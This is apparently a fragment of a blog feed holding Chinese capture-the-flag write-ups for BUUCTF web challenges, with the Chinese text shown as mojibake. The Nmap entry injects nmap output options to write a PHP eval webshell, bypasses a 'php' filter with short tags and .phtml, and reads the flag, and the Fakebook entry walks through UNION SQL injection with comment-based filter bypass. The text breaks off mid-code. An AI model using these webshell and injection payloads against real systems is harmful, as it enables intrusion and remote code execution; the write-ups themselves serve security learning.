txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162243017.png" alt="image-20230823162243017"></p><p>flag&#x3D;flag{507104d6-24f2-405b-8de5-f60bdc690138}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap é¢˜è§£</title>
    <link href="/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"/>
    <url>/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/</url>
    
    <content type="html"><![CDATA[<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>1.æœ‰é¢˜ç›®æç¤ºå¾—è¿™æ˜¯ä¸€é“è€ƒå¯ŸNmapæ‰§è¡Œçš„é¢˜ç›®:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" alt="image-20230822100327583"></p><p>è¾“å…¥æ¡†ä¸­æˆ‘ä»¬å¯ä»¥è¾“å…¥ipåœ°å€æˆ–hostname</p><p>æµ‹è¯•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" alt="image-20230822100434322"></p><p>2.åœ¨kaliä¸­æµ‹è¯•nmap:</p><p>nmapå¯¹ipåœ°å€çš„å¤„ç†</p><p><strong>æ‰«æIPåœ°å€:</strong></p><p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" alt="image-20230822101659678"></p><p>è¿”å›çš„ç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure><p>è€Œç½‘ç«™ä¸­çš„è¿”å›ç»“æœä¸º:</p><p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" alt="image-20230822102909620"></p><p>ä¸¤è€…çš„è¿”å›ç»“æœéƒ½æ˜¯TCPåè®®ï¼Œç„¶åæœ‰Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p><p>**æ‰«ææŒ‡å®šIPåœ°å€(ping æ‰«æ)**ï¼š<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" alt="image-20230822103048486"></p><p>è¿”å›ç»“æœä¸­æ²¡æœ‰è¡¨æ˜æ˜¯TCPåè®®</p><p>æ‰€ä»¥ä¸€èˆ¬ç½‘ç«™ä½¿ç”¨TCPè¿”å›ï¼Œéƒ½æ˜¯nmapæ‰«ææˆ–nmap -sT æ‰«æ(é»˜è®¤æ˜¯nmap)</p><p>çŒœæµ‹è¯¥ç½‘å€çš„æ‰«æå½¢å¼ä¸º:nmap â€œè¾“å…¥çš„ipåœ°å€â€</p><p>2.nmapæ‰«ææ¼æ´åˆ©ç”¨:</p><p>nmapä¸­å¯ä»¥ç”¨äºå°†æ‰«æç»“æœå†™æ–‡ä»¶å¹¶è¾“å‡ºä¿å­˜åœ¨æœ¬åœ°çš„å‘½ä»¤:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (æ ‡å‡†è¾“å‡º)<br><br>-oX (XMLè¾“å‡º)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grepè¾“å‡º)<br><br>-oA (è¾“å‡ºè‡³æ‰€æœ‰æ ¼å¼)<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" alt="image-20230822104553681"></p><p>å‘ç°åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆäº†ä¸€ä¸ªtest.txtæ–‡ä»¶</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¾“å‡ºè¿™ä¸ªæ¼æ´ï¼Œå°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨è¯¥è¾“å‡ºæ¼æ´å°†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ä¿å­˜åˆ°ç½‘é¡µçš„å½“å‰æ–‡ä»¶å¤¹ä¸­ï¼Œå°±å¯ä»¥å®ç°æ³¨å…¥</p><p>æµ‹è¯•2:</p><p>æµ‹è¯•ç½‘é¡µæ˜¯å¦å¯ä»¥è¿›è¡Œè¾“å‡ºå‘½ä»¤çš„æ‰§è¡Œ:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" alt="image-20230822105255949"></p><p>ç½‘é¡µæˆåŠŸå›æ˜¾ï¼Œä¸”è¿”å›çš„ç»“æœå’Œæµ‹è¯•çš„ç»“æœç›¸ä¼¼ï¼Œè¯´æ˜è¯¥æŒ‡ä»¤è¢«æˆåŠŸæ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ æ³¨å…¥payload</p><p>3.æ„é€ ä¸€å¥è¯æœ¨é©¬:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" alt="image-20230822105623631"></p><p>å‘ç°è¾“å…¥çš„ç»“æœå¯èƒ½è¢«è¿‡æ»¤,é‡‡ç”¨ç¬¬äºŒä¸ªpayloadè¯•è¯•<br>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" alt="image-20230822105915275"></p><p>ä¾ç„¶è¢«è¿‡æ»¤</p><p>4.ç°åœ¨å°±è¦ä¸€ä¸ªä¸ªè¿›è¡Œåˆ¤æ–­ï¼Œå¯»æ‰¾è¢«è¿‡æ»¤çš„å†…å®¹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" alt="image-20230822115002077"></p><p>å­˜åœ¨é»‘åå•å†…å®¹</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" alt="image-20230822115127287"></p><p>ç”±äºè¯¥æ–‡ä»¶ä¸å¯è¢«è¯†åˆ«ï¼Œæ‰€ä»¥å°±æ— æ³•æ˜¾ç¤ºå†…å®¹</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" alt="image-20230822115207663"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" alt="image-20230822115311166"></p><p>æ‰€ä»¥è¿‡æ»¤çš„å†…å®¹ä¸ºphp,æˆ‘ä»¬éœ€è¦ç»•è¿‡phpåˆ¤æ–­</p><p><strong>phpä¸€å¥è¯æœ¨é©¬çš„æ„é€ </strong></p><p>å¯ä»¥è§£æphpæ–‡ä»¶çš„åç¼€å:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">.php2<br>.php3<br>.php4<br>.php5<br>.phtml<br></code></pre></td></tr></table></figure><p>phtml:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">666<br></code></pre></td></tr></table></figure><p>phpçŸ­æ ‡ç­¾ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  #å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on<br>&lt;?=(è¡¨è¾¾å¼)?&gt;  ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt;  #ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®<br>&lt;% echo &#x27;123&#x27;;%&gt;   #å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œå¹¶ä¸”åªèƒ½åœ¨7.0ä»¥ä¸‹ç‰ˆæœ¬ä½¿ç”¨<br>&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:<br><? echo '123';?> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;888&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">888<br></code></pre></td></tr></table></figure><?=(è¡¨è¾¾å¼)?><p>  ç­‰ä»·äº <?php echo (è¡¨è¾¾å¼)?> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br><span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>&lt;% echo â€˜123â€™;%&gt; :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡php:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  =&gt; &lt;? echo @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;?=(è¡¨è¾¾å¼)?&gt;  =&gt; &lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;% echo &#x27;123&#x27;;%&gt; =&gt; &lt;% echo @eval($_POST[&#x27;pass&#x27;]);%&gt;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><? echo @eval($_POST['pass']);?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" alt="image-20230822125459893"></p><?= @eval($_POST['pass'];?><p>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" alt="image-20230822125704414"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" alt="image-20230822130015713"></p><p>ç»•è¿‡</p><p>æ„é€ å†™æ–‡ä»¶è¾“å‡ºpayload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" alt="image-20230822131843981"></p><p>å‘ç°æˆåŠŸç»•è¿‡:<br>è®¿é—®pass.phtml:</p><p>ç”±äºå½“äºoGè¾“å‡ºçš„æ–‡ä»¶éƒ½åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€ä»¥ä¸º:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" alt="image-20230822132212701"></p><p>å‘ç°å½“å‰ç½‘ç«™ä¸‹æ²¡æœ‰è¯¥æ–‡ä»¶ï¼Œä»ä¹‹å‰çš„[BUUCTF 2018]Online Toolä¸­è·å–çš„ç»éªŒï¼Œnmapå¯èƒ½å’Œescapeshellarg()ä¸escapeshellcmd()é…åˆä½¿ç”¨ï¼Œéœ€è¦ç»•è¿‡è¿™ä¸¤ä¸ªå‡½æ•°ï¼šä½¿ç”¨ç©ºæ ¼å’Œå•å¼•å·,ä¸ºäº†é˜²æ­¢â€™passâ€™çš„å•å¼•å·ä¹Ÿè¢«è¿™ä¸¤ä¸ªå‡½æ•°è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨â€passâ€:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" alt="image-20230822132957714"></p><p>è®¿é—®pass.phtml:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" alt="image-20230822132932341"></p><p>ä½¿ç”¨webshellæµ‹è¯•:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" alt="image-20230822133218223"></p><p>å‘ç°ä¸€ä¸ªflagæ–‡ä»¶:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>è¿”å›ç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt"># Nmap 6.47 scan initiated Tue Aug 22 05:28:38 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/e0e2e -oG pass.phtml \ flag&#123;544d334f-80b2-44f8-a3b1-c8b312b0b484&#125;<br> \\<br># Nmap done at Tue Aug 22 05:28:39 2023 -- 0 IP addresses (0 hosts up) scanned in 0.27 seconds<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{544d334f-80b2-44f8-a3b1-c8b312b0b484}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_Fakebook1 é¢˜è§£</title>
    <link href="/2023/08/21/2023-08-20-Fakebook1/"/>
    <url>/2023/08/21/2023-08-20-Fakebook1/</url>
    
    <content type="html"><![CDATA[<h1 id="Fakebook1"><a href="#Fakebook1" class="headerlink" title="Fakebook1"></a>Fakebook1</h1><p>1.ç‚¹å‡»ç™»é™†ç•Œé¢join,ç”³è¯·ä¸€ä¸ªç”¨æˆ·:<br>admin,123,18,bai.com</p><p>2.ç™»å½•ç½‘ç«™åï¼Œç‚¹å‡»admin,å‘ç°ç½‘å€æœ‰æ³¨å…¥ç‚¹:</p><p><a href="http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1">http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1</a></p><p>no,åº”è¯¥æ˜¯è®°å½•çš„ç¼–å·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡noè¿›è¡Œæ³¨å…¥</p><p>æ³¨å†Œä¸€ä¸ªè´¦æˆ·ä¹‹åè‡ªåŠ¨ç”Ÿæˆè®°å½•çš„ç¼–å·ï¼Œæ‰€ä»¥ç¼–å·ä¸ºè‡ªåŠ¨é€’å¢å‹ä¸ºint</p><p>3.éšä¾¿æ³¨å…¥no&#x3D;1â€™,ç½‘é¡µå“åº”æœ‰sqlæŠ¥é”™ï¼Œæ‰€ä»¥è¯¥ç½‘é¡µå­˜åœ¨sqlè¯­å¥æ³¨å…¥</p><p>4.çŒœæµ‹è¯¥ç½‘é¡µä½¿ç”¨äº†select * from where no &#x3D; </p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨1 union select 1,2,3;#</p><p>ä½†æ˜¯è¿”å›äº†no hacker,æ‰€ä»¥å¯èƒ½è¿‡æ»¤äº†select</p><p>æ‰€ä»¥å¯ä»¥ç”¨</p><p>â€“ å†…è”æ³¨é‡Šç»•è¿‡<br>&#x2F;*!select *&#x2F;1ï¼Œ2ï¼Œ3ï¼Œ4;</p><p>5.çˆ†å­—æ®µ:1 order by 4;#</p><p>å½“order by 5#æ—¶æŠ¥é”™ï¼Œæ‰€ä»¥æœ€å¤§å­—æ®µæ•°ä¸º4</p><p>6.ä½¿ç”¨-1 union&#x2F;*!select *&#x2F;1ï¼Œ2ï¼Œ3ï¼Œ4;</p><p>åªæœ‰usernameè¿”å›å€¼ä¸º2ï¼Œæ‰€ä»¥åªæœ‰ç¬¬äºŒä¸ªå­—æ®µèƒ½å¤ŸæˆåŠŸè¿”å›å€¼</p><p>ä½¿ç”¨-1æ˜¯ä¸ºäº†ä½¿å“åº”ç½‘å€åªè¿”å›æˆ‘ä»¬selectçš„å†…å®¹</p><p>7.çˆ†æ•°æ®åº“:-1 union&#x2F;*!select *&#x2F;1,database(),3,4;</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(database()),3,4;&#x2F;&#x2F;çˆ†å‡ºæ‰€æœ‰æ•°æ®åº“</p><p>uernameçˆ†å‡ºæ•°æ®åº“ä¸ºfakebook</p><p>åªæœ‰ä¸€ä¸ªæ•°æ®åº“</p><p>8.çˆ†è¡¨</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema</p><p>&#x3D; DATABASE();&#x2F;&#x2F;database()å¯ä»¥ç›´æ¥æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼Œä¸€èˆ¬æ˜¯åªæœ‰ä¸€ä¸ªæ•°æ®åº“æ‰å¯ä»¥ç”¨ï¼Œå¦åˆ™å°±è¦æŒ‡å®šæ•°æ®åº“</p><p>usernameå­—æ®µæ˜¾ç¤ºusersè¡¨</p><p>9.çˆ†å­—æ®µ</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(column_name),3,4  from information_schema.COLUMNS where table_schema &#x3D; â€˜fakebookâ€™ and table_name &#x3D; â€˜usersâ€™;</p><p>usernameå­—æ®µæ˜¾ç¤ºno,username,passwd,dataå­—æ®µ</p><p>dataå­—æ®µæ˜¯ä¹‹å‰æ²¡æœ‰çœ‹åˆ°è¿‡çš„ï¼Œæ‰€ä»¥ç°åœ¨è¦æŸ¥çœ‹å­—æ®µçš„å€¼</p><p>10.çˆ†å­—æ®µçš„å€¼</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(data),3,4 from users</p><p>username:çˆ†å‡ºå­—æ®µå€¼:O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:7:â€bai.comâ€;} </p><p>è¿™æ˜¯ä¸€ä¸ªåºåˆ—åŒ–è¯­å¥:è¡¨ç¤ºæœ‰ä¸€ä¸ªUserInfoç±»ï¼Œè¿™ä¸ªç±»æœ‰å‚æ•°name,age,blog</p><p>æ²¡æœ‰è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æŸ¥çœ‹å…¶ä»–å‡ ä¸ªå­—æ®µçš„å†…å®¹</p><p>11.çˆ†å…¶ä»–å­—æ®µ:</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(no,username,passwd),3,4 from users</p><p>usernameçˆ†å‡ºå­—æ®µçš„å€¼:1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>å‘ç°é™¤äº†noå’Œusernameå­—æ®µå…¶ä»–ä¸ºå¯†æ–‡ï¼Œè¿›è¡Œè§£å¯†:</p><p>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>å‘ç°è§£å¯†å¤±è´¥ï¼Œæ‰€ä»¥å¯èƒ½ä¸æ˜¯å¯†æ–‡</p><p>12.æŸ¥çœ‹ç½‘é¡µçš„robots.txtæ–‡ä»¶ï¼ŒæŸ¥çœ‹ç½‘é¡µè¿˜å…è®¸æˆ‘ä»¬æŸ¥çœ‹çš„æ–‡ä»¶æœ‰å“ªäº›:</p><p><a href="http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt">http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt</a></p><p>è·å¾—ä¸€ä¸ªuser.php.bakæ–‡ä»¶ï¼Œå°†å®ƒä¸‹è½½:</p><p>13.åˆ†æuser.php.bakä¸­çš„ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//UserInfoç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//æœ‰å‚ç”³è¯·ç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//curl_init()å‡½æ•°ç”¨äºåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œå¯ä»¥ç”¨äºè·å–ç½‘é¡µåœ°å€ã€è®¾ç½®ç½‘é¡µå¤´ä¿¡æ¯ç­‰</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-comment">//curl_setopt â€” è®¾ç½®ä¸€ä¸ªcURLä¼ è¾“é€‰é¡¹</span><br>        <span class="hljs-comment">//CURLOPT_URL: è¿™æ˜¯ä½ æƒ³ç”¨PHPå–å›çš„URLåœ°å€ã€‚ä½ ä¹Ÿå¯ä»¥åœ¨ç”¨curl_init()å‡½æ•°åˆå§‹åŒ–æ—¶è®¾ç½®è¿™ä¸ªé€‰é¡¹</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = 